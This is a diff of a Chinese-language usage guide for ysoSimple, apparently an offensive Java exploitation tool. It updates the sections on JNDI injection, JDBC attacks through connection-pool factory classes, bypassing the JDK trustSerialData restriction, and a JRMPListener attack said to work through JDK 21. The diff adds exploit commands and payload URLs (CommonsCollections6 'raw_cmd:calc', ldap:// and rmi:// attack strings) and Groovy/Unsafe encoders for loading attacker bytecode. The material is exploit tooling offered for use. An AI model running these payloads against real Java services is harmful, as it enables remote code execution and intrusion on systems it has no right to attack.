@@ -2327,11 +2327,11 @@ rmi://127.0.0.1:1099/WriteFile/aHR0cDovLzEyNy4wLjAuMToxMzM3Ly4uLy4uLy4uLy4uLy4uL
 
 在很多的数据库连接池中都有Factory工厂类继承自ObjectFactory，而这些工厂类又都和数据库连接相关，所以可通过数据库连接池的工厂类进行JDBCAttack攻击。
 
-* Commons DBCP：CommonsDBCP1/CommonsDBCP2
-* Tomcat DBCP：TomcatDBCP1/TomcatDBCP2
-* Alibaba Druid：Druid
-* HikariCP：HikariCP
-* Tomcat JDBC(DataSourceFactory)：/TomcatJDBC
+* Commons DBCP：CommonsDBCP1(org.apache.commons.dbcp.BasicDataSourceFactory)/CommonsDBCP2(org.apache.commons.dbcp2.BasicDataSourceFactory)
+* Tomcat DBCP：TomcatDBCP1(org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory)/TomcatDBCP2(org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory)
+* Alibaba Druid：Druid(com.alibaba.druid.pool.DruidDataSourceFactory)
+* HikariCP：HikariCP(com.zaxxer.hikari.HikariJNDIFactory)
+* Tomcat JDBC：TomcatJDBC(org.apache.tomcat.jdbc.pool.DataSourceFactory)
 
 将jndi连接串URL中的Factory替换为 CommonsDBCP1/CommonsDBCP2/TomcatDBCP1/TomcatDBCP2/Druid/HikariCP 其中之一
 
@@ -2614,7 +2614,7 @@ Usage: java -cp ysoSimple.jar cn.butler.jndi.server.DerbyServer [-p <port>] [-g 
 
 `-h`: 获取使用方式
 
-### ldap-Deserialize打法
+### ldap-Deserialize打法(<JDK20)
 
 描述：LDAP反序列化的攻击流程先让受害者的JNDI服务访问恶意LDAP服务器，然后LDAP服务器返回恶意的序列化数据，受害者反序列化二进制流完成攻击。该LDAP反序列化受限制于isSerialDataAllowed方法，也就是系统属性`com.sun.jndi.ldap.object.trustSerialData`​，在jdk20+开始该属性默认值为true。但jdk20+之后可以通过构造javaFactory属性打本地工厂类继续攻击。
 
@@ -2628,9 +2628,19 @@ ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils2/Templateslmpl:auto_cmd:calc
 ldap://127.0.0.1:1389/Deserialize/FindGadgetByDNS/g11ksb.dnslog.cn
 ```
 
-### ldap-useReferenceOnly打法(对抗trustSerialData属性)
+### ldap-useReferenceOnly打法(对抗trustSerialData属性 <JDK20)
 
-描述：对于LDAP协议的JNDI注入, 如果利用本地ObjectFactory绕过, 目前已有的方法是将LDAP协议返回的javaSerializedData属性设置为 Reference 对象的序列化数据。但是自 JDK 21 开始 `com.sun.jndi.ldap.object.trustSerialData`​ 参数默认为 false, 即无法通过 javaSerializedData 属性设置 Reference 对象，LDAP打反序列化和LDAP打本地工厂类都失效。但是可通过的 LDAP 的 javaReferenceAddress 属性使得服务端直接返回 Reference 对象, 因为不涉及 javaSerializedData 属性, 所以也绕过了 trustSerialData 参数的限制
+描述：对于LDAP协议的JNDI注入, 如果利用本地ObjectFactory绕过, 目前已有的方法是将LDAP协议返回的javaSerializedData属性设置为 Reference 对象的序列化数据。
+
+自JDK17开始官方新增https://docs.oracle.com/en/java/javase/17/docs/api/java.naming/module-summary.html了`com.sun.jndi.ldap.object.trustSerialData`属性但是该属性的默认值是true，依然可使用 javaSerializedData进行利用。在随后的 JDK 20 https://docs.oracle.com/en/java/javase/20/docs/api/java.naming/module-summary.html开始将 `com.sun.jndi.ldap.object.trustSerialData` 参数默认为 false, 即无法通过 javaSerializedData 属性设置序列化数据 Reference 对象来利用。至此LDAP打反序列化和LDAP打本地工厂类都失效。
+
+但是研究发现可通过的 LDAP 的 javaReferenceAddress 属性使得服务端直接返回 Reference 对象, 因为不涉及 javaSerializedData 属性, 所以也绕过了 trustSerialData 属性的限制。
+
+注意：上述说的是javaSerializedData属性的对抗，在<JDK20之前都是可以利用的。在jdk20之后使用 com.sun.naming.internal.ObjectFactoriesFilter 做了一层默认的过滤器，过滤器中要求即使在`trustSerialData`属性为true的情况下，也不能在对远程工厂类进行实例化。<img src="images/image-20250527173015749.png" alt="image-20250527173015749" style="zoom: 67%;" /><img src="images/image-20250527173036548.png" alt="image-20250527173036548" style="zoom:50%;" />
+
+参考jdk代码：https://github.com/openjdk/jdk/blob/jdk-20%2B25/src/java.naming/share/classes/com/sun/naming/internal/ObjectFactoriesFilter.java
+
+LDAPServer部分的代码：
 
 ```java
 public void processSearchResult(InMemoryInterceptedSearchResult searchResult) {
@@ -2660,16 +2670,16 @@ public void processSearchResult(InMemoryInterceptedSearchResult searchResult) {
 -m JNDIAttack -jndi-useReferenceOnly
 ```
 
-### RMI-JRMPListener打法
+### RMI-JRMPListener打法(最终解)
 
-描述：这个是和[1ue](https://vidar-team.feishu.cn/docx/ScXKd2ISEo8dL6xt5imcQbLInGc)师傅学习的，属于RMI中的JRMP攻击手法因为是JRMP层的攻击，所以不会受到jep290限制。我本地测试的jdk8u65，jdk8u381，jdk17u8都可以打通。直接开启JRMPListener作为服务端
+描述：这个是和[1ue](https://vidar-team.feishu.cn/docx/ScXKd2ISEo8dL6xt5imcQbLInGc)师傅学习的，属于RMI中的JRMP攻击手法因为是JRMP层的攻击，所以不会受到jep290限制。我本地测试的jdk8u65，jdk8u381，jdk17u8，jdk21都可以打通。直接开启JRMPListener作为服务端
 
 工具：使用方式
 
 1. JRMPListener开启RMI服务端监听：
 
 ```java
-java -cp ysoSimple.jar cn.butler.yso.exploit.JRMPListener 1234 Jackson "Templateslmpl:sleep:10"
+java -cp ysoSimple.jar cn.butler.yso.exploit.JRMPListener 1234 CommonsCollections6 "raw_cmd:calc"
 ```
 
 RMI Payload：
@@ -2695,7 +2705,9 @@ rmi://127.0.0.1:1234/Basic
 
   * JS-JavaCode：JS执行Java代码
   * SPEL-JSCode-JavaCode：SPEL使用JS表达式执行Java代码
-  * GroovyShell-JSCode-JavaCode：GroovyShell使用JS表达式执行Java代码，JS表达式使用Unsafe调用Java代码模式才能在Groovy中执行成功
+  * Groovy-JavaCode-UtilBase64：Groovy直接调用unsafe模式来加载java代码，java.util.Base64解密方案
+  * Groovy-JavaCode-MiscBase64：Groovy直接调用unsafe模式来加载java代码，sun.misc.BASE64Decoder解密方案
+  * GroovyShell-JSCode-JavaCode：Groovy使用JS表达式执行Java代码，JS表达式使用Unsafe调用Java代码模式才能在Groovy中执行成功
 * fileModify：将生成的字节码转存特殊的文件格式中，XSTL文件转存
 
   * XSTL：将字节码放入XSTL文件中方便使用，Hessian反序列化利用链XSTL需要
@@ -2741,12 +2753,20 @@ rmi://127.0.0.1:1234/Basic
 
 描述：将生成的字节码进行编码输出，Hex，Base64，BCEL编码。或者套用JS-JavaCode模板，SPEL-JSCode模板
 
-工具：使用encode参数，后面跟着Base64，Hex，BCEL，JS-JavaCode，SPEL-JSCode-JavaCode，GroovyShell-JSCode-JavaCode
+工具：使用encode参数，后面跟着Base64，Hex，BCEL，JS-JavaCode，SPEL-JSCode-JavaCode，Groovy-JavaCode-UtilBase64，Groovy-JavaCode-MiscBase64，Groovy-JSCode-JavaCode
+
+- Groovy-JavaCode-UtilBase64：Groovy使用java.util.Base64解码字节码然后使用Unsafe进行字节码加载。
+- Groovy-JavaCode-MiscBase64：Groovy使用sun.misc.BASE64Decoder解码字节码然后使用Unsafe进行字节码加载。
+- Groovy-JSCode-JavaCode：Groovy使用ScriptEngineManager执行Java字节码
 
 ```python
 -m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "BCEL"
 
--m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "GroovyShell-JSCode-JavaCode"
+-m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "Groovy-JavaCode-UtilBase64"
+
+-m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "Groovy-JavaCode-MiscBase64"
+
+-m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "Groovy-JSCode-JavaCode"
 ```
 
 #### fileModify 转存特殊格式文件
